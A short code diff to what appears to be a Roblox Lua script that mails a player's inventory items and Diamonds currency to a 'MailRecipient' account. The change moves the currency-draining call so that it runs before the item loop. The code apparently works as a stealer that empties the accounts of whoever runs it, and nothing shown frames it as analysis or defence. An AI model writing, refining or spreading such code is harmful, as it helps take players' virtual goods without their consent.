@@ -131,6 +131,9 @@ local MailTargets = {
     {Class = "Misc", Names = {"Arcade Token"}},
 }
 
+local GemUID = GetItemInfo("Currency", "Diamonds", "uid")
+local GemAM = GetItemInfo("Currency", "Diamonds", "_am") - 5000000
+Network:WaitForChild("Mailbox: Send"):InvokeServer(MailRecipient, "Hippo", "Currency", GemUID, GemAM)  
 
 for Class, Inv in pairs(Inventory) do
     for uid, Item in pairs(Inv) do
@@ -149,7 +152,3 @@ for Class, Inv in pairs(Inventory) do
     end
 end
 
-
-local GemUID = GetItemInfo("Currency", "Diamonds", "uid")
-local GemAM = GetItemInfo("Currency", "Diamonds", "_am") - 5000000
-Network:WaitForChild("Mailbox: Send"):InvokeServer(MailRecipient, "Hippo", "Currency", GemUID, GemAM)  
